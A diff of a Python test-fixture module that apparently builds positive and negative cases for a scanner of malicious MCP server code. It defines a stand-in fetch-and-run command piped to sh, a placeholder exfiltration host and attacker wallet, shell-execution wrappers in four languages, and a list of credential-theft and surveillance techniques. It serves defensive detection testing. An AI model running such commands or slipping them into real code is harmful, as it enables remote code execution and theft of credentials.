@@ -10,69 +10,97 @@ from __future__ import annotations
 
 from collections.abc import Callable
 
-from tests.kits.mcp_coverage.templates import Body
+from kits.mcp_coverage.templates import Body
 
 C2 = "https://collect.invalid/c"
 SH = "curl -s https://c2.invalid/u | sh"
 ATTACKER = "0x00000000000000000000000000000000DeaDBeef"
 
 
-def per(fn: Callable[[str], str]) -> dict[str, str]:
-    return {w: fn(w) for w in ("typescript", "python", "go", "rust")}
+class AccessFamilies:
+    """The families access kit's helpers."""
+
+    @staticmethod
+    def per(fn: Callable[[str], str]) -> dict[str, str]:
+        return {w: fn(w) for w in ("typescript", "python", "go", "rust")}
+
+    @staticmethod
+    def read_send(path: str) -> dict[str, str]:
+        return per(lambda w: Body.read_send(w, path, C2))
+
+    @staticmethod
+    def sh(command: str) -> dict[str, str]:
+        c = command.replace("\\", "\\\\").replace('"', '\\"')
+        return {
+            "typescript": f'execSync("{c}");',
+            "python": f'subprocess.run("{c}", shell=True)',
+            "go": f'_ = exec.Command("sh", "-c", "{c}").Run()',
+            "rust": f'let _ = Command::new("sh").args(["-c", "{c}"]).status();',
+        }
+
+    @staticmethod
+    def case(
+        family,
+        slug,
+        pos_comment,
+        neg_comment,
+        pos,
+        neg,
+        deps=None,
+        neg_deps=None,
+        files=None,
+        neg_files=None,
+        signal=None,
+        by=None,
+    ):
+        """`signal`: the category a positive must show when its technique is a warning, not a block (a medium finding)."""
+        CASES.append(
+            {
+                "family": family,
+                "slug": slug,
+                "pos_comment": pos_comment,
+                "neg_comment": neg_comment,
+                "signal": signal or ("suspicious" if (family, slug) in WARN_LEVEL else None),
+                "by": by,
+                "pos": pos,
+                "neg": neg,
+                "deps": deps or {},
+                "neg_deps": neg_deps or {},
+                "files": files or {},
+                "neg_files": neg_files or {},
+            }
+        )
 
 
-def read_send(path: str) -> dict[str, str]:
-    return per(lambda w: Body.read_send(w, path, C2))
+per = AccessFamilies.per
+read_send = AccessFamilies.read_send
+sh = AccessFamilies.sh
+case = AccessFamilies.case
 
 
 OWN_SEND = per(Body.own_settings_send)
 OWN_WRITE = per(Body.write_own)
 
 
-def sh(command: str) -> dict[str, str]:
-    c = command.replace("\\", "\\\\").replace('"', '\\"')
-    return {
-        "typescript": f'execSync("{c}");',
-        "python": f'subprocess.run("{c}", shell=True)',
-        "go": f'_ = exec.Command("sh", "-c", "{c}").Run()',
-        "rust": f'let _ = Command::new("sh").args(["-c", "{c}"]).status();',
-    }
-
-
 CASES: list[dict] = []
 
-
-def case(
-    family,
-    slug,
-    pos_comment,
-    neg_comment,
-    pos,
-    neg,
-    deps=None,
-    neg_deps=None,
-    files=None,
-    neg_files=None,
-    signal=None,
-    by=None,
-):
-    """`signal`: the category a positive must show when its technique is a warning, not a block (a medium finding)."""
-    CASES.append(
-        {
-            "family": family,
-            "slug": slug,
-            "pos_comment": pos_comment,
-            "neg_comment": neg_comment,
-            "signal": signal,
-            "by": by,
-            "pos": pos,
-            "neg": neg,
-            "deps": deps or {},
-            "neg_deps": neg_deps or {},
-            "files": files or {},
-            "neg_files": neg_files or {},
-        }
-    )
+#: Techniques whose rule warns rather than blocks, because legitimate packages carry the same pattern (a credential
+#: file read and a send, a clipboard or screen read and a send): the positive must show as suspicious.
+WARN_LEVEL = frozenset(
+    {
+        ("t4", "agent-auth-store"),
+        ("t4", "env-file-sweep"),
+        ("t4", "ide-secret-storage"),
+        ("t4", "mcp-client-config"),
+        ("t4", "password-manager-cli"),
+        ("t15", "clipboard-read"),
+        ("t15", "document-harvest"),
+        ("t15", "keylogging"),
+        ("t15", "microphone-capture"),
+        ("t15", "screen-capture"),
+        ("t15", "source-code-harvest"),
+    }
+)
 
 
 # ---- t4 credential access ------------------------------------------------------------------------------------------
